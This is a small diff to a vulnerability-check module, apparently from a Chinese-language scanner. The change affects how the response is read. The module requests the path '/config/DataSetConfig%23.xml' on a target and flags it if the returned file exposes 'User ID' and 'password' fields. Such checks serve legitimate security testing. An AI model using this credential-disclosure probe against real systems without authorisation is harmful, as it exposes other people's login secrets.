@@ -50,7 +50,7 @@ class Poc(ABPoc):
             payload = "/config/DataSetConfig%23.xml"
             verify_url = self.target + payload
             r1 = requests.get(verify_url)
-            if 'User ID' in r1.content and 'password' in r1.content:
+            if 'User ID' in r1.text and 'password' in r1.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
